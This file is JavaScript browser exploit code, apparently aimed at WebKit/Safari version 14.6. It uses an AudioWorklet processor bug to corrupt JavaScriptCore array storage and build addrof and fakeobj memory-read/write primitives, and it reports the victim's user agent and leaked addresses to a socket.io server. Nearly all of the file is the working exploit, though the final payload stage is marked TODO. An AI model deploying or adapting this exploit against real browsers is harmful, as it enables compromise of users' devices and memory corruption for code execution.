var socket = io.connect("/");

var keep = [];
async function kickstart146() {
	socket.emit("exploit_start", {
		exploitVersion: "14.6",
		userAgent: navigator.userAgent,
	});
	var context = new OfflineAudioContext(1, 128, 300000);
	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
      // constant added to double JSValues
      const socket = io.connect('/');
      const kBoxedDoubleOffset = 0x0002000000000000n;
      function boxDouble(d) {
        return d + kBoxedDoubleOffset;
      }
      function unboxDouble(d) {
        return d - kBoxedDoubleOffset;
      }
      // the structure ID is wrong, but we'll fix it :)
      let doubleArrayCellHeader = 0x0108230700000000n;
      let f = new Float64Array(1);
      let u = new Uint32Array(f.buffer);
      function float2bigint(v) {
        f[0] = v;
        return BigInt(u[0]) | (BigInt(u[1]) << 32n);
      }
      function bigint2float(v) {
        u[0] = Number(v & 0xffffffffn);
        u[1] = Number(v >> 32n);
        return f[0];
      }

      // store things to prevent GC
      let keep = [];
      function gc(n=10000) {
        let tmp = [];
        for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
      }

      // message port to talk to main thread; will be set later
      let port = null;

      // will be implemented later
      let fakeobj = null;
      let addrof = null;

      for (var i = 0; i < 100; i++) keep.push([1.1*i]);
      let a0 = [0,0,0,0,0,0,0,0,0,0];
      let a1 = [0,0,0,0,0,0,0,0,0,0];
      // transition to unboxed double storage
      a1[3] = 13.37;
      let b0 = [0,0,0,0,0,0,0,0,0,0];
      let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array

      // put zeroes in first two slots so JSCallbackData destruction is safe
      delete b1[0];
      delete b1[1];

      function setupPrimitives() {
        port.postMessage("setting up");
        if (a1.length != 0x1337) {
          port.postMessage("Failure on array length");
          return;
        }

        const kSentinel = 1333.337;
        let offset = -1;

        b1[0] = kSentinel;
        // scan for the sentinel to find the offset from a to b
        for (var i = 0; i < 0x100; i++) {
          if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
            offset = i;
            break;
          }
        }
        if (offset == -1) {
          port.postMessage("Failure finding offset");
          return;
        }

        // temporary implementations
        addrof = (val) => {
          b1[0] = val;
          return float2bigint(a1[offset]);
        }
        fakeobj = (addr) => {
          a1[offset] = bigint2float(addr);
          return b1[0];
        }

        let obj = {
          jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
          fakeButterfly: a0
        };

        let addr = addrof(obj);
        socket.emit("log_normal", "Found obj @ 0x" + addr.toString(16));
        port.postMessage("obj @ " + addr.toString(16));

        let fakeArr = fakeobj(addr + 0x10n);

        // subtract off the incref
        doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
        socket.emit("log_normal", "double array header @ 0x" + doubleArrayCellHeader.toString(16));
        port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));

        // fix broken cell header
        fakeArr[0] = bigint2float(doubleArrayCellHeader);

        // grab a real butterfly pointer
        let doubleArrayButterfly = float2bigint(fakeArr[1]);

        // fix other broken cell header
        obj.fakeButterfly = b0;
        fakeArr[0] = bigint2float(doubleArrayCellHeader);

        // fix the broken butterflys and setup cleaner addrof / fakeobj
        obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
        obj.fakeButterfly = a1;
        fakeArr[1] = bigint2float(doubleArrayButterfly);
        obj.fakeButterfly = b1;
        fakeArr[1] = bigint2float(doubleArrayButterfly);

        fakeobj = (addr) => {
          a1[0] = bigint2float(addr);
          return b1[0];
        }
        addrof = (val) => {
          b1[0] = val;
          return float2bigint(a1[0]);
        }
      }

      function pwn() {
        try {
          setupPrimitives();

          // ensure we can survive GC
          gc();

          // TODO: rest of exploit goes here

          port.postMessage("done!");
        } catch(e) { // send exception strings to main thread (for debugging)
          port.postMessage("Exception!!");
          port.postMessage(e.toString());
        }
      }

      registerProcessor("a", class {
        constructor() {
          // setup a message port to the main thread
          port = new AudioWorkletProcessor().port;
          port.onmessage = pwn;

          // this part is magic
          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
          eval('1 + 0x1336');

          // overwrite a1's butterfly with a fastMalloc pointer
          return {fill: 1, a: a0};
        }
      });
      registerProcessor("b", class {
        constructor() {
          // overwrite b1's butterfly with a fastMalloc pointer
          return {fill: 1, b: b0};
        }
      });
    `,], { type: "text/javascript" })))
    .then(async () => {
        var wa = new AudioWorkletNode(context, "a");
        var wb = new AudioWorkletNode(context, "b");
        wa.port.onmessage = (e) => {
            socket.emit("log_normal", e.data);
        };
        await new Promise((res) => setTimeout(res, 100));
        wa.port.postMessage("pwn");
    })
    .catch((err) => {
        socket.emit("log_normal", "Error: " + err);
    });
}
